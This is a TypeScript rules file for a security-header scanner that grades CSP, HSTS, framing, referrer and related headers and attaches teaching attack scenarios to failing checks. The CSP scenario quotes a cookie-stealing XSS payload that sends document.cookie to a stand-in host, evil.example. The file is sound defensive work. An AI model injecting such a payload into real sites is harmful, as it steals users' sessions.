import type { CheckResult, Rule, ScanContext } from "./types.js";

/**
 * Recommended values used both for grading hints and for the config
 * generators, so the report and the generated snippets always agree.
 */
export const RECOMMENDED = {
  "Content-Security-Policy":
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'",
  "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
  "X-Content-Type-Options": "nosniff",
  "X-Frame-Options": "SAMEORIGIN",
  "Referrer-Policy": "strict-origin-when-cross-origin",
  "Permissions-Policy": "camera=(), microphone=(), geolocation=()",
  "Cross-Origin-Opener-Policy": "same-origin",
  "Cross-Origin-Resource-Policy": "same-origin",
} as const;

/**
 * Concrete attack scenarios, keyed by header. Attached to any check that
 * doesn't pass, so the report can teach *why* the header matters, not just
 * that it's missing. Shown by `--explain` and always present in JSON output.
 */
export const EXPLOITS: Record<string, string> = {
  "Content-Security-Policy":
    "An attacker finds any injection point — a comment field, a search box reflected into the page, a " +
    "compromised npm package — and plants <script>fetch('https://evil.example/?c='+document.cookie)</script>. " +
    "Without CSP the browser runs it with your users' sessions: tokens stolen, keyloggers installed, " +
    "fake login forms overlaid. With script-src 'self', that injected inline script is refused.",
  "Strict-Transport-Security":
    "A user on coffee-shop Wi-Fi types your domain without https://. Their first request goes out over " +
    "plain HTTP, and an attacker on the network (sslstrip-style) answers it, keeps them on HTTP, and " +
    "reads or rewrites everything — including the login form they're about to submit. HSTS makes the " +
    "browser refuse to ever use HTTP for your domain after the first visit.",
  "X-Content-Type-Options":
    "Your app serves user uploads. An attacker uploads 'avatar.jpg' that actually contains HTML and " +
    "JavaScript. Without nosniff, some browsers content-sniff the response, decide it's HTML, and " +
    "execute the script in YOUR origin — stored XSS delivered through a file upload.",
  "X-Frame-Options":
    "Clickjacking: an attacker's page loads your site in an invisible full-screen iframe and positions " +
    "a fake 'Play video' button exactly over your real 'Delete account' or 'Transfer funds' button. " +
    "The victim clicks their page but presses yours — with their logged-in session.",
  "Referrer-Policy":
    "A user lands on your password-reset page: /reset?token=abc123. The page loads a third-party " +
    "analytics script or the user clicks an external link — and the full URL, token included, is sent " +
    "in the Referer header to that other origin. Anyone with access to those logs can reset the password.",
  "Permissions-Policy":
    "Any script that gets into your page — a compromised ad, a hijacked third-party widget, an XSS " +
    "payload — can prompt for camera, microphone, or geolocation, styled to look like your app is " +
    "asking. Disabling features you don't use removes the entire capability, prompt and all.",
  "Cross-Origin-Opener-Policy":
    "Your site opens (or is opened by) a malicious page: window.opener keeps a live handle across " +
    "origins. That enables tabnabbing (rewriting your tab to a phishing clone while the user looks " +
    "away) and XS-Leaks that probe frame counts and navigation state to infer what a logged-in user " +
    "can see. COOP: same-origin severs that handle.",
  "Cross-Origin-Resource-Policy":
    "A malicious site embeds your authenticated resources (API responses, user images) as no-cors " +
    "subresources, pulling them into its process — where Spectre-class side channels can read them. " +
    "CORP tells the browser to refuse cross-origin embedding outright.",
  "X-Powered-By":
    "Reconnaissance: 'X-Powered-By: Express' tells an attacker exactly which framework CVEs and " +
    "default behaviors to try. Version-scanning bots use this header to sort targets into exploit lists.",
  Server:
    "A Server header with a version number ('nginx/1.25.3') lets attackers match your exact build " +
    "against public CVE databases and skip straight to the exploits that apply to it.",
  "X-XSS-Protection":
    "The legacy XSS auditor this header controls was itself exploitable: attackers abused it to " +
    "selectively neutralize legitimate scripts (XS-Search side channels). Every modern browser has " +
    "removed it — sending anything but '0' is at best noise, at worst a vulnerability on old browsers.",
};

/** Minimum HSTS max-age we consider adequate: 180 days. */
const HSTS_MIN_AGE = 15552000;

function result(
  rule: { header: string; weight: number },
  status: CheckResult["status"],
  message: string,
  earnedFraction: number,
  recommended?: string
): CheckResult {
  return {
    header: rule.header,
    status,
    message,
    earned: Math.round(rule.weight * earnedFraction),
    weight: rule.weight,
    recommended,
  };
}

const csp: Rule = {
  header: "Content-Security-Policy",
  weight: 25,
  check(ctx) {
    const value = ctx.headers["content-security-policy"];
    if (!value) {
      // A report-only policy monitors violations but blocks nothing.
      if (ctx.headers["content-security-policy-report-only"]) {
        return result(
          this,
          "warn",
          "Only Content-Security-Policy-Report-Only is set. Violations are reported but nothing is blocked; promote the policy to the enforcing header once the reports are clean.",
          0.25,
          RECOMMENDED["Content-Security-Policy"]
        );
      }
      return result(
        this,
        "fail",
        "Missing. CSP is your strongest defense against XSS.",
        0,
        RECOMMENDED["Content-Security-Policy"]
      );
    }
    const lower = value.toLowerCase();
    const problems: string[] = [];
    if (/script-src[^;]*'unsafe-inline'/.test(lower) || (!lower.includes("script-src") && /default-src[^;]*'unsafe-inline'/.test(lower))) {
      problems.push("'unsafe-inline' in scripts defeats most of CSP's XSS protection");
    }
    if (lower.includes("'unsafe-eval'")) {
      problems.push("'unsafe-eval' allows eval()-based injection");
    }
    if (/(?:default-src|script-src)\s+[^;]*(?:^|\s)\*(?:\s|;|$)/.test(lower)) {
      problems.push("wildcard (*) source allows scripts from anywhere");
    }
    if (problems.length > 0) {
      return result(this, "warn", `Present, but: ${problems.join("; ")}.`, 0.5);
    }
    return result(this, "pass", "Present with no obviously unsafe directives.", 1);
  },
};

const hsts: Rule = {
  header: "Strict-Transport-Security",
  weight: 20,
  check(ctx) {
    const value = ctx.headers["strict-transport-security"];
    if (!value) {
      if (ctx.isLocalHttp) {
        // Browsers ignore HSTS over plain HTTP anyway; don't punish dev.
        return result(
          this,
          "warn",
          "Missing — expected on plain-HTTP localhost (browsers ignore HSTS over HTTP), but make sure production sends it.",
          0.75,
          RECOMMENDED["Strict-Transport-Security"]
        );
      }
      return result(
        this,
        "fail",
        "Missing. Without HSTS, users can be downgraded to plain HTTP.",
        0,
        RECOMMENDED["Strict-Transport-Security"]
      );
    }
    const maxAge = /max-age=(\d+)/i.exec(value);
    const age = maxAge?.[1] ? parseInt(maxAge[1], 10) : 0;
    if (age < HSTS_MIN_AGE) {
      return result(
        this,
        "warn",
        `max-age is ${age}s — recommend at least ${HSTS_MIN_AGE} (180 days).`,
        0.5,
        RECOMMENDED["Strict-Transport-Security"]
      );
    }
    if (!/includesubdomains/i.test(value)) {
      return result(this, "warn", "Present, but consider adding includeSubDomains.", 0.85);
    }
    return result(this, "pass", "Present with a strong max-age.", 1);
  },
};

const contentTypeOptions: Rule = {
  header: "X-Content-Type-Options",
  weight: 10,
  check(ctx) {
    const value = ctx.headers["x-content-type-options"];
    if (!value) {
      return result(this, "fail", "Missing. Prevents MIME-type sniffing attacks.", 0, "nosniff");
    }
    if (value.trim().toLowerCase() !== "nosniff") {
      return result(this, "warn", `Set to "${value}" — the only valid value is "nosniff".`, 0.25, "nosniff");
    }
    return result(this, "pass", "Set to nosniff.", 1);
  },
};

const frameOptions: Rule = {
  header: "X-Frame-Options",
  weight: 10,
  check(ctx) {
    const xfo = ctx.headers["x-frame-options"];
    const cspValue = ctx.headers["content-security-policy"] ?? "";
    const hasFrameAncestors = /frame-ancestors/i.test(cspValue);
    if (hasFrameAncestors) {
      // CSP frame-ancestors supersedes X-Frame-Options in modern browsers.
      return result(this, "pass", "Covered by CSP frame-ancestors (supersedes X-Frame-Options).", 1);
    }
    if (!xfo) {
      return result(
        this,
        "fail",
        "Missing (and no CSP frame-ancestors). Your site can be framed for clickjacking.",
        0,
        "SAMEORIGIN"
      );
    }
    const v = xfo.trim().toUpperCase();
    if (v === "DENY" || v === "SAMEORIGIN") {
      return result(this, "pass", `Set to ${v}.`, 1);
    }
    return result(this, "warn", `Set to "${xfo}" — use DENY or SAMEORIGIN (ALLOW-FROM is obsolete).`, 0.25, "SAMEORIGIN");
  },
};

const referrerPolicy: Rule = {
  header: "Referrer-Policy",
  weight: 10,
  check(ctx) {
    const value = ctx.headers["referrer-policy"];
    if (!value) {
      return result(
        this,
        "fail",
        "Missing. Full URLs (including query strings) leak to other origins.",
        0,
        RECOMMENDED["Referrer-Policy"]
      );
    }
    const v = value.trim().toLowerCase();
    const strong = new Set([
      "no-referrer",
      "same-origin",
      "strict-origin",
      "strict-origin-when-cross-origin",
    ]);
    const weak = new Set(["unsafe-url", "no-referrer-when-downgrade", "origin-when-cross-origin"]);
    if (strong.has(v)) {
      return result(this, "pass", `Set to ${v}.`, 1);
    }
    if (weak.has(v)) {
      return result(this, "warn", `"${v}" leaks more than needed — prefer strict-origin-when-cross-origin.`, 0.5, RECOMMENDED["Referrer-Policy"]);
    }
    return result(this, "warn", `Set to "${value}".`, 0.5, RECOMMENDED["Referrer-Policy"]);
  },
};

const permissionsPolicy: Rule = {
  header: "Permissions-Policy",
  weight: 10,
  check(ctx) {
    const value = ctx.headers["permissions-policy"];
    if (!value) {
      return result(
        this,
        "warn",
        "Missing. Lets you disable powerful features (camera, mic, geolocation) you don't use.",
        0,
        RECOMMENDED["Permissions-Policy"]
      );
    }
    return result(this, "pass", "Present.", 1);
  },
};

const coop: Rule = {
  header: "Cross-Origin-Opener-Policy",
  weight: 5,
  check(ctx) {
    const value = ctx.headers["cross-origin-opener-policy"];
    if (!value) {
      return result(
        this,
        "warn",
        "Missing. COOP isolates your window from cross-origin openers (Spectre-class protection).",
        0,
        RECOMMENDED["Cross-Origin-Opener-Policy"]
      );
    }
    return result(this, "pass", `Set to ${value}.`, 1);
  },
};

const corp: Rule = {
  header: "Cross-Origin-Resource-Policy",
  weight: 5,
  check(ctx) {
    const value = ctx.headers["cross-origin-resource-policy"];
    if (!value) {
      return result(
        this,
        "warn",
        "Missing. CORP controls which origins may embed your resources.",
        0,
        RECOMMENDED["Cross-Origin-Resource-Policy"]
      );
    }
    return result(this, "pass", `Set to ${value}.`, 1);
  },
};

/** Penalty-only rules: weight 0, but negative `earned` when they trip. */

const poweredBy: Rule = {
  header: "X-Powered-By",
  weight: 0,
  check(ctx) {
    const value = ctx.headers["x-powered-by"];
    if (value) {
      return {
        header: this.header,
        status: "warn",
        message: `Leaks "${value}" — remove it (in Express: app.disable('x-powered-by')).`,
        earned: -3,
        weight: 0,
      };
    }
    return { header: this.header, status: "pass", message: "Not sent.", earned: 0, weight: 0 };
  },
};

const serverHeader: Rule = {
  header: "Server",
  weight: 0,
  check(ctx) {
    const value = ctx.headers["server"];
    if (value && /\d/.test(value)) {
      return {
        header: this.header,
        status: "warn",
        message: `Leaks a version number ("${value}") — hide it (nginx: server_tokens off).`,
        earned: -3,
        weight: 0,
      };
    }
    return { header: this.header, status: "pass", message: value ? `"${value}" (no version leaked).` : "Not sent.", earned: 0, weight: 0 };
  },
};

const xssProtection: Rule = {
  header: "X-XSS-Protection",
  weight: 0,
  check(ctx) {
    const value = ctx.headers["x-xss-protection"];
    if (value && value.trim() !== "0") {
      return {
        header: this.header,
        status: "warn",
        message: `Deprecated and can introduce vulnerabilities — remove it or set to "0". Use CSP instead.`,
        earned: -2,
        weight: 0,
      };
    }
    return { header: this.header, status: "pass", message: "Not sent (good — it's deprecated).", earned: 0, weight: 0 };
  },
};

export const rules: Rule[] = [
  csp,
  hsts,
  contentTypeOptions,
  frameOptions,
  referrerPolicy,
  permissionsPolicy,
  coop,
  corp,
  poweredBy,
  serverHeader,
  xssProtection,
];

export function runRules(ctx: ScanContext): CheckResult[] {
  return rules.map((rule) => {
    const result = rule.check(ctx);
    // Attach the attack scenario to anything that isn't clean, so every
    // surface (CLI, middleware, JSON) can explain the stakes.
    if (result.status !== "pass") {
      result.exploit = EXPLOITS[result.header];
    }
    return result;
  });
}
